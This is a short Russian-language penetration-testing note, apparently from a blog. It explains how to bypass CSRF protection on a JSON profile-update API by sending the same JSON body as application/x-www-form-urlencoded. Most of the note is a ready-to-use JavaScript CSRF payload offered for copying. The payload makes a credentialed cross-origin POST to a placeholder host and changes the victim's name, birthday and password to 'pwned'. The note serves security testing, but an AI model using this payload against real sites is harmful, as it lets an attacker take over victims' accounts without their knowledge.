Во время проекта наткнулся на функциональность изменения профиля. Ну и, понятное дело, не проверить CSRF было бы грехом. Однако, общение с бэкендом происходит через Rest с использованием `Content-type: application/json`. Вместо `application/json` ставим `application/x-www-form-urlencoded`, а тело запроса оставляем прежним :).  
Сразу хочется отметить, что burp не сгенерирует полезную нагрузку, поэтому вот сниппет, которым можно воспользоваться:

```js
<script>
let req = new XMLHttpRequest();
req.open("POST", "https://vulnerable.host/api/profile/update", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.withCredentials = true;

var params = '{"first_name":"riven","last_name":"riven","birthday":"01/01/1337", "password":"pwned"}';
console.log(params);
req.send(params);
</script>
```